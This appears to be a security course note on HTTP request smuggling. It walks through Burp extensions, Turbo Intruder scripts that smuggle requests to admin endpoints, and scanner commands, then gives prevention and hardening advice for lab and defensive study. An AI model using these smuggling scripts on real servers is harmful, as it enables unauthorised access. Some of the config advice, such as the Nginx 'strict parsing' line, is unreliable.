# 🛡️ Request Smuggling Tools & Prevention

## Tools of the Trade

### HTTP Request Smuggler (Burp Extension)

The primary tool for identifying and exploiting HTTP request smuggling vulnerabilities.

#### Installation

1. Open Burp Suite
2. Go to **Extensions** tab
3. Click **BApp Store**
4. Search for "HTTP Request Smuggler"
5. Click **Install**

---

## Using HTTP Request Smuggler

### Feature 1: Convert to Chunked Encoding

Automatically converts request body to chunked format with correct hex chunk sizes.

#### Before Conversion

```http
POST / HTTP/1.1
Host: clte.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

param1=HelloWorld
```

#### How to Convert

1. Send request to Burp Repeater
2. Right-click request
3. **Extensions** → **HTTP Request Smuggler** → **Convert to chunked**

#### After Conversion

```http
POST / HTTP/1.1
Host: clte.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Transfer-Encoding: chunked

11
param1=HelloWorld
0

```

> **Note**: `11` hex = 17 decimal (length of `param1=HelloWorld`)

---

### Feature 2: Automated Smuggle Attacks

#### Launch Attack

1. Format request in chunked encoding
2. Right-click request
3. **Extensions** → **HTTP Request Smuggler** → Choose attack type:
   - **Smuggle attack (CL.TE)**
   - **Smuggle attack (TE.CL)**

#### Turbo Intruder Window

Opens with pre-configured attack script.

**Customize the prefix** (smuggled request):

```python
prefix = '''GET /admin.php HTTP/1.1
Host: target.htb

'''
```

#### Running the Attack

1. Modify prefix as needed
2. Click **Attack** button
3. Wait for iterations (sends every ~1 second)
4. Click **Halt** to stop
5. Analyze response lengths

#### Interpreting Results

| Request # | Response Length | Meaning |
|-----------|-----------------|---------|
| 1 | 4618 | Normal index response |
| **2** | **Different** | **Smuggled request response!** |
| 3+ | 4618 | Normal responses |

Different response length on request 2 = **Vulnerability confirmed!**

---

### Customizing Turbo Intruder Script

#### Default Script Structure

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=10,
                          pipeline=False)
    
    prefix = '''GET /admin.php HTTP/1.1
Host: %s

''' % target.baseInput.headers['Host']

    # Attack iterations
    for i in range(30):
        engine.queue(target.req, prefix)
        time.sleep(1)
```

#### Modifications

| Change | How |
|--------|-----|
| Different smuggled path | Edit `prefix` variable |
| Add headers to smuggled | Add to `prefix` string |
| Change timing | Modify `time.sleep(1)` |
| More iterations | Change `range(30)` |
| Add POST body | Include in `prefix` |

#### Example: Smuggled POST with Cookie

```python
prefix = '''POST /admin/delete HTTP/1.1
Host: %s
Cookie: session=your_session
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

user_id=1
''' % target.baseInput.headers['Host']
```

---

## Other Useful Tools

### smuggler.py

Python-based automated scanner.

```bash
# Installation
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Usage
python3 smuggler.py -u https://target.htb
```

### h2csmuggler

HTTP/2 cleartext smuggling tool.

```bash
# Installation
pip3 install h2csmuggler

# Usage
h2csmuggler -u https://target.htb
```

### Manual Testing (Burp Repeater)

For precise control:

1. Disable "Update Content-Length"
2. Create tab groups
3. Send in sequence (single connection)

---

## HTTP Request Smuggling Prevention

### Why Prevention is Difficult

| Challenge | Reason |
|-----------|--------|
| **Server-level bugs** | Vulnerabilities in web server software, not application |
| **Hidden behavior** | Developers unaware of underlying quirks |
| **Architecture complexity** | Multiple systems parsing same requests |
| **Legacy support** | HTTP/1.1 specification ambiguities |

---

### Prevention Recommendations

#### 1. Keep Software Updated

```
✅ Update web server software (Apache, Nginx, Gunicorn, etc.)
✅ Update reverse proxy software (HAProxy, Varnish, etc.)
✅ Apply security patches immediately
✅ Monitor CVE databases for new vulnerabilities
```

**Why**: Most smuggling bugs are fixed in patches.

#### 2. Patch "Unexploitable" Vulnerabilities

```
✅ Fix client-side vulnerabilities (XSS in headers)
✅ Don't dismiss issues as "unexploitable"
✅ Consider smuggling as attack chain component
```

**Why**: Request smuggling can weaponize otherwise unexploitable bugs.

#### 3. Configure Connection Handling

```
✅ Close TCP connections on any error/exception
✅ Don't reuse connections after parsing errors
✅ Implement strict request parsing
```

**Why**: Prevents desync from propagating to other requests.

#### 4. Use HTTP/2 End-to-End

```
✅ Enable HTTP/2 between client and server
✅ Disable HTTP/1.x if possible
✅ Avoid HTTP/2 → HTTP/1.1 downgrade
```

**Why**: HTTP/2 uses binary framing, eliminating CL/TE ambiguity.

---

### Server-Specific Hardening

#### Nginx

```nginx
# Reject ambiguous requests
proxy_http_version 1.1;
proxy_set_header Connection "";

# Strict parsing
ignore_invalid_headers off;
```

#### Apache

```apache
# Strict HTTP parsing
HttpProtocolOptions Strict
```

#### HAProxy

```
# Reject both CL and TE
option http-use-htx
http-request deny if { req.hdr_cnt(content-length) gt 1 }
http-request deny if { req.hdr_cnt(transfer-encoding) gt 1 }
```

---

### Architecture Best Practices

#### Use Same Software Stack

```
                 ❌ BAD                          ✅ BETTER
┌─────────┐    ┌─────────┐          ┌─────────┐    ┌─────────┐
│ HAProxy │ → │ Gunicorn│          │  Nginx  │ → │  Nginx  │
└─────────┘    └─────────┘          └─────────┘    └─────────┘
  (different parsing)                 (same parsing)
```

#### Normalize Requests at Edge

```
Edge Proxy:
1. Validate request
2. Reject if both CL and TE present
3. Normalize headers
4. Forward cleaned request
```

#### Monitor for Anomalies

```
✅ Log requests with both CL and TE headers
✅ Alert on unusual response patterns
✅ Track 400/405 errors that correlate with other requests
```

---

### Detection Checklist

| Check | Action |
|-------|--------|
| Both CL and TE present | Block or normalize |
| CL with chunked body | Block |
| Multiple CL headers | Block |
| Multiple TE headers | Block |
| Malformed TE values | Block |
| Unusual whitespace in headers | Block |

---

### HTTP/2 Benefits

HTTP/2 eliminates request smuggling because:

| HTTP/1.1 Problem | HTTP/2 Solution |
|------------------|-----------------|
| Text-based parsing | Binary framing |
| CL/TE ambiguity | Stream-based length |
| Connection reuse issues | Multiplexed streams |
| Header manipulation | HPACK compression |

**However**: Be cautious of HTTP/2 → HTTP/1.1 downgrades at reverse proxy!

---

## Summary

### Tools Quick Reference

| Tool | Purpose |
|------|---------|
| **HTTP Request Smuggler** | Burp extension for auto-exploitation |
| **Turbo Intruder** | Automated timing attacks |
| **smuggler.py** | Python scanner |
| **h2csmuggler** | HTTP/2 smuggling |

### Prevention Priority

1. 🔄 **Update** all proxy/server software
2. 🔐 **Patch** all vulnerabilities (even "unexploitable" ones)
3. ⚠️ **Configure** strict error handling
4. 🚀 **Upgrade** to HTTP/2 where possible

---

## References

- [HTTP Request Smuggler - PortSwigger](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
- [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)
- [smuggler.py - GitHub](https://github.com/defparam/smuggler)
- [HTTP/2 Request Smuggling](https://portswigger.net/research/http2)
- [OWASP - HTTP Request Smuggling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Incoming_Requests)

